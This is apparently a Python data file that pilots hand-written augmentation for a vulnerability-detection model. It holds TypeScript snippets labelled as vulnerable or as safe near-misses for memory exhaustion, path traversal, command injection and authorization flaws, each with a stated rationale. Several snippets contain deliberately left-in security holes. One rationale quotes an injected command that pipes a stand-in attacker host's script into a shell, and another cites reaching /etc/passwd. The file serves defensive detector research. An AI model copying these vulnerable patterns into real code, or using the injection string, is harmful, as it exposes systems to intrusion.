"""Hand-authored augmentation pilot: variants + near-misses around real TS CVEs.

THE PROBLEM THIS ATTACKS. A standard contrastive pair gives one vulnerable point
and one safe point, and the cheapest boundary separating them is "is a
guard-shaped token present?". v12 fits `shape1_contrastive_ts` to 0.0076 loss and
still scores MCC 0.000 on TypeScript -- it learned that boundary perfectly, and
the boundary is wrong. Adding more pairs of the same shape adds no gradient.

TWO AUGMENTATIONS, each breaking a different shortcut:

  VARIANT_VULN   same mechanism, different surface. Several spellings of one
                 flaw make surface features stop predicting the label, so only
                 the invariant -- the mechanism -- survives as a signal.

  NEARMISS_SAFE  same surface, source NOT attacker-controlled. Shape screams
                 "vulnerable" and it is not. This is the case the model has never
                 seen: 32/32 missed vulns previously CONFABULATED a guard because
                 the model has no representation of "not exploitable".

THE LABELLING RULE THAT MAKES THIS DEFENSIBLE. Near-misses vary the SOURCE, never
the guard. "Is this value attacker-reachable?" is answerable by reading; "is this
guard adequate?" is a judgement call. Guard-removal was rejected for exactly that
reason -- it produced code of unknown exploitability. Every record below states
why its label is true.

NOT the failed synthetic mode: `shape_react_syn` scored 100% while real React
scored 41.2%, because it was INVENTED textbook code. These are written in the
idiom of the real project they came from, around the real sink.

Pilot only -- 4 bases. Read every record before scaling.
"""

# Each base names its real CVE anchor so provenance survives augmentation.
PILOT = [
    # ---------------------------------------------------------------- CWE-770
    dict(
        base_cve="(mcp-framework readRequestBody)", cwe="CWE-770",
        mechanism="request body accumulated with no running total and no ceiling, "
                  "so the client decides how much memory the server allocates",
        variant_vuln=[
            dict(
                code="""// src/transports/ws/session.ts
  private async collect(req: IncomingMessage): Promise<string> {
    const chunks: Buffer[] = [];
    for await (const chunk of req) {
      chunks.push(chunk as Buffer);
    }
    return Buffer.concat(chunks).toString("utf8");
  }""",
                source="chunk", sink="chunks.push",
                why="`for await` over the request pushes every chunk into `chunks` with no "
                    "size accounting. A client that keeps streaming grows the array until the "
                    "process exhausts memory - the same flaw as string concatenation, written "
                    "with an async iterator instead of an event handler",
            ),
            dict(
                code="""// src/transports/http/upload.ts
  handleUpload(req: IncomingMessage, res: ServerResponse) {
    const parts: string[] = [];
    req.setEncoding("utf8");
    req.on("data", (c: string) => parts.push(c));
    req.on("end", () => res.end(JSON.stringify({ length: parts.join("").length })));
  }""",
                source="c", sink="parts.push",
                why="each decoded chunk is pushed into `parts` unbounded; the join at the end "
                    "materialises the whole client-controlled payload a second time, so peak "
                    "memory is twice what the attacker sent and still uncapped",
            ),
        ],
        nearmiss_safe=[
            dict(
                code="""// src/transports/http/replay.ts
  private async collectFixture(name: string): Promise<string> {
    const chunks: Buffer[] = [];
    const file = createReadStream(join(FIXTURE_DIR, FIXTURES[name]));
    for await (const chunk of file) {
      chunks.push(chunk as Buffer);
    }
    return Buffer.concat(chunks).toString("utf8");
  }""",
                source="FIXTURES[name]", sink="chunks.push",
                why="the accumulation is identical in shape to the vulnerable version, but the "
                    "stream is a file chosen from the fixed `FIXTURES` map inside `FIXTURE_DIR`. "
                    "No caller can introduce data of unbounded size, so there is nothing for an "
                    "attacker to grow",
                safe_because="source is a constant map lookup, not request data",
            ),
            dict(
                code="""// src/transports/http/server.ts
  private async readBounded(req: IncomingMessage): Promise<string> {
    const declared = Number(req.headers["content-length"] ?? "0");
    if (!Number.isFinite(declared) || declared > this._config.maxMessageSize) {
      throw new Error("payload too large");
    }
    const buf = Buffer.allocUnsafe(declared);
    let off = 0;
    for await (const chunk of req) {
      off += (chunk as Buffer).copy(buf, off);
    }
    return buf.toString("utf8");
  }""",
                source="req", sink="chunk.copy",
                why="this DOES read request data, so the source is attacker-controlled - but the "
                    "allocation is fixed at `declared` bytes, which is rejected before allocation "
                    "if it exceeds `maxMessageSize`. Memory is bounded by configuration, so the "
                    "resource-exhaustion mechanism is absent",
                safe_because="allocation size is validated against a configured ceiling first",
            ),
        ],
    ),
    # ---------------------------------------------------------------- CWE-22
    dict(
        base_cve="(openclaw pi-tools.read)", cwe="CWE-22",
        mechanism="a caller-supplied path is joined onto a base directory and read "
                  "without confirming the result stays inside that base",
        variant_vuln=[
            dict(
                code="""// src/agents/attachment.ts
export async function loadAttachment(name: string): Promise<Buffer> {
  const target = path.resolve(ATTACH_ROOT, name);
  return await fs.readFile(target);
}""",
                source="name", sink="fs.readFile",
                why="`path.resolve` does not constrain the result to `ATTACH_ROOT` - it happily "
                    "resolves `../../etc/passwd` to a path outside it, and an absolute `name` "
                    "discards the base entirely. Any file the process can read is reachable",
            ),
            dict(
                code="""// src/agents/export.ts
export function streamReport(id: string, res: ServerResponse) {
  const file = `${REPORT_DIR}/${id}.json`;
  createReadStream(file).pipe(res);
}""",
                source="id", sink="createReadStream",
                why="string interpolation builds the path, so `id` containing `../` walks out of "
                    "`REPORT_DIR`, and the `.json` suffix is defeated by a NUL byte or by an `id` "
                    "that itself ends in a traversal to a chosen file. The stream is piped "
                    "straight to the response, exfiltrating it",
            ),
        ],
        nearmiss_safe=[
            dict(
                code="""// src/agents/preset.ts
export async function loadPreset(kind: PresetKind): Promise<Buffer> {
  const target = path.resolve(PRESET_ROOT, PRESET_FILES[kind]);
  return await fs.readFile(target);
}""",
                source="PRESET_FILES[kind]", sink="fs.readFile",
                why="structurally identical to the vulnerable `loadAttachment` - resolve against a "
                    "root, then read - but the filename comes from `PRESET_FILES` keyed by the "
                    "union type `PresetKind`. The set of reachable paths is fixed at compile time, "
                    "so no input selects a path outside the root",
                safe_because="filename is a lookup in a closed map keyed by a union type",
            ),
            dict(
                code="""// src/agents/workspace.ts
export async function readWorkspaceFile(rel: string): Promise<Buffer> {
  const root = await fs.realpath(WORKSPACE_ROOT);
  const target = await fs.realpath(path.resolve(root, rel));
  if (!target.startsWith(root + path.sep)) {
    throw new Error("outside workspace");
  }
  return await fs.readFile(target);
}""",
                source="rel", sink="fs.readFile",
                why="`rel` IS attacker-controlled, but both sides are canonicalised with "
                    "`realpath` before comparison, so symlinks and `..` segments are resolved "
                    "before the containment test rather than after. A path that escapes the root "
                    "fails the check and never reaches the read",
                safe_because="canonicalise-then-compare, so the check cannot be bypassed by links",
            ),
        ],
    ),
    # ---------------------------------------------------------------- CWE-78
    dict(
        base_cve="(markdownify-mcp exec -> execFile)", cwe="CWE-78",
        mechanism="an untrusted value is interpolated into a command STRING that a "
                  "shell parses, so metacharacters become syntax",
        variant_vuln=[
            dict(
                code="""// src/convert/office.ts
export async function toPdf(filePath: string): Promise<string> {
  const out = `${filePath}.pdf`;
  await execAsync(`libreoffice --headless --convert-to pdf "${filePath}"`);
  return out;
}""",
                source="filePath", sink="execAsync",
                why="the surrounding double quotes do not make this safe: a filePath containing a "
                    "double quote closes the quoted section, after which `;` or `$( )` begins a "
                    "command of the attacker's choosing, running with the server's privileges",
            ),
            dict(
                code="""// src/convert/media.ts
export function probe(url: string, cb: (e: Error | null, s?: string) => void) {
  exec("ffprobe -v quiet -print_format json -show_format " + url, (e, stdout) =>
    cb(e, stdout),
  );
}""",
                source="url", sink="exec",
                why="`url` is concatenated with no quoting at all, so a value like "
                    "`x; curl attacker.example | sh` is parsed by the shell as a second command. "
                    "Being a URL-shaped string constrains nothing - it is plain text to the shell",
            ),
        ],
        nearmiss_safe=[
            dict(
                code="""// src/convert/thumbnail.ts
export async function renderThumb(filePath: string): Promise<Buffer> {
  const { stdout } = await execFileAsync("convert", [filePath, "-resize", "128x128", "png:-"], {
    encoding: "buffer",
  });
  return stdout as unknown as Buffer;
}""",
                source="filePath", sink="execFileAsync",
                why="`filePath` is fully attacker-controlled and still reaches a process spawn - "
                    "but `execFile` takes the program and an ARGUMENT ARRAY, and no shell is "
                    "involved. `;`, `$( )` and quotes are ordinary characters in a filename, so "
                    "there is no syntax for them to break into",
                safe_because="argv array with no shell, so metacharacters cannot become syntax",
            ),
            dict(
                code="""// src/convert/version.ts
export async function toolVersion(tool: ToolName): Promise<string> {
  const { stdout } = await execAsync(`${TOOL_BINARIES[tool]} --version`);
  return stdout.trim();
}""",
                source="TOOL_BINARIES[tool]", sink="execAsync",
                why="this DOES build a shell command string, which is the vulnerable shape - but "
                    "the interpolated value is a binary path from the constant `TOOL_BINARIES` map "
                    "keyed by the `ToolName` union. No input reaches the command line, so there is "
                    "nothing for an attacker to inject",
                safe_because="interpolated value is a constant lookup, not input",
            ),
        ],
    ),
    # ------------------------------------------------- CWE-863 (present-but-wrong)
    dict(
        base_cve="(openclaude bashPermissions)", cwe="CWE-863",
        mechanism="a permission decision is consulted and then mishandled, so a "
                  "check that LOOKS present does not enforce anything",
        variant_vuln=[
            dict(
                code="""// src/tools/permissions.ts
export function gate(input: ToolInput, ctx: PermissionContext): Decision {
  const decision = evaluatePolicy(input, ctx);
  if (decision.behavior !== "deny") {
    return { behavior: "allow" };
  }
  return decision;
}""",
                source="input", sink="evaluatePolicy",
                why="the policy IS evaluated, so a reader sees an authorization check - but every "
                    "outcome other than an explicit `deny` is converted into `allow`. An `ask` "
                    "requiring confirmation, or an `unknown` from a policy that failed to load, "
                    "both become permission granted. The check runs and enforces nothing",
            ),
            dict(
                code="""// src/tools/middleware.ts
export async function requireAdmin(req: RequestAuth, res: Response, next: () => void) {
  await authorize("admin", req, res, next);
  if (!req.user?.administrator) {
    throw Errors.ADMIN_ONLY;
  }
}""",
                source="req", sink="authorize",
                why="`next` is handed to `authorize`, which invokes it to continue the middleware "
                    "chain BEFORE the administrator test runs. The throw fires afterwards, by "
                    "which time the request has already advanced to the protected handler. The "
                    "guard is present, correct in isolation, and ordered too late to matter",
            ),
        ],
        nearmiss_safe=[
            dict(
                code="""// src/tools/permissions.ts
export function gate(input: ToolInput, ctx: PermissionContext): Decision {
  const decision = evaluatePolicy(input, ctx);
  if (decision.behavior === "deny" || decision.behavior === "ask") {
    return decision;
  }
  if (decision.behavior !== "allow") {
    return { behavior: "deny", reason: "unrecognised policy outcome" };
  }
  return decision;
}""",
                source="input", sink="evaluatePolicy",
                why="same shape as the vulnerable gate - evaluate, then branch on the outcome - but "
                    "`deny` and `ask` are propagated, and anything not explicitly `allow` fails "
                    "closed. No policy outcome silently becomes permission granted",
                safe_because="enumerates outcomes explicitly and defaults to deny",
            ),
            dict(
                code="""// src/tools/middleware.ts
export async function requireAdmin(req: RequestAuth, res: Response, next: () => void) {
  const session = await authorize("admin", req, res, () => {});
  if (!session || !session.user?.administrator) {
    throw Errors.ADMIN_ONLY;
  }
  next();
}""",
                source="req", sink="authorize",
                why="`authorize` is given a no-op instead of `next`, so it cannot advance the chain "
                    "on its own. The session it returns is tested, and `next()` runs only after "
                    "the administrator check passes - the control is on the path in the right order",
                safe_because="continuation is withheld until after the authorization test",
            ),
        ],
    ),
]
